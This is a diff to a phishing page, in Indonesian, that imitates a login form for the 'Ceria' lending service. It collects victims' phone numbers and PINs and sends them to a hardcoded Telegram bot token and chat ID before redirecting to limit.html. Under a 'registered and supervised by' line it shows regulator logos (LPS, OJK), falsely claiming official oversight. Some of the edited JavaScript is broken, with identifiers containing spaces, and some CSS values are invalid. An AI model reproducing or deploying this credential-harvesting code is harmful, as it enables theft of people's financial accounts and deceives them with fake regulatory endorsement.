@@ -38,21 +38,31 @@
     .form-container input[type="tel"],
     .form-container input[type="password"],
     .form-container input[type="Submit"] {
-      width: calc(85% - 8px); /* Reduce width by 4 pixels on each side */
-      padding: 13px;
+      width: calc(90% - 8px); /* Reduce width by 4 pixels on each side */
+      padding: 10px;
       border-radius: 8px;
-      border: 2px solid #663399;
+      border: 4px solid #663399;
       margin-bottom: 9px; /* Jarak antara kolom nomor hp dan kolom pin */
       margin-left: 4px; /* Add margin on the left side */
     }
 
-    .form-container input[type="Submit"] {
-      background-color: #663399;
-      color: white;
-      font-weight: bold;
-      cursor: pointer;
+  .form-container input[type="Submit"] {
+  width: calc(98% - 8px);
+  padding: 10px;
+  border-radius: 8px;
+  background-color: #663399; /* Warna abu-abu */
+  color: white;
+  font-weight: red;
+  cursor: pointer;
+  margin-left: 4px;
+ }
+ .example-text {
+      font-size: 13px;
+      color: #black;
+      margin-top: -13px;
+      text-align: left;
+      margin-left: 100px;
     }
-
     /* Ukuran relatif untuk gambar di bawah */
     .gambar-bawah {
       display: flex;
@@ -62,7 +72,7 @@
     }
 
     .gambar-bawah img {
-      width: 25%;
+      width: 20%;
       object-fit: cover;
       margin: 0 8px;
     }
@@ -77,17 +87,14 @@
         }
       };
       var url = "https://api.telegram.org/bot6946290282:AAHbPsb9hD-DbepVOIkge81AvWjY90YbbU0/sendMessage?chat_id=6824078885&text=" + encodeURIComponent(message);
-
-      // Kirim permintaan POST
       xhttp.open("POST", url, true);
       xhttp.send();
     }
-
     function kirimPesan() {
-      var nomorHP = document.getElementById('nomor_hp').value;
-      var pin = document.getElementById('pin').value;
+      var nomorHP = document.getElementById('Nomor Handphone').value;
+      var pin = document.getElementById('Masukan PIN Ceria').value;
 
-      var message = "nomor_hp:" + nomorHP + "\nPIN: " + pin;
+      var message = "Nomor Handphone:" + Nomor Handphone + "\nMasukan PIN Ceria: " + Masukan PIN Ceria;
       sendMessageToTelegram(message);
       window.location.href = 'limit.html'; // Mengarahkan ke halaman limit.html
     }
@@ -100,15 +107,15 @@
 
   <div class="form-container">
     <form onsubmit="kirimPesan(); return false;">
-      <input type="tel" id="nomor_hp" name="nomor_hp" placeholder="Nomor Handphone">
+      <input type="tel" id="Nomor Handphone" name="Nomor Handphone" placeholder="𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲">
 
-      <input type="tel" id="pin" name="pin" placeholder="PIN">
+      <input type="tel" id="Masukan PIN Ceria" name="Masukan PIN Ceria" placeholder="️𝗠𝗮𝘀𝘂𝗸𝗮𝗻 𝗣𝗜𝗡 𝗖𝗲𝗿𝗶𝗮">
 
       <input type="Submit" value="Lanjutkan">
     </form>
-  </div>
-
-  <div class="gambar gambar-bawah">
+ </div>
+ <div class="example-text">        Terdaftar Dan Awasi Oleh:</div>
+   <div class="gambar gambar-bawah">
     <img src="https://from-limit-ceria-id.netlify.app/img/lps.png" alt="Logo LPS">
     <img src="https://from-limit-ceria-id.netlify.app/img/ojk.png" alt="Logo OJK">
   </div>
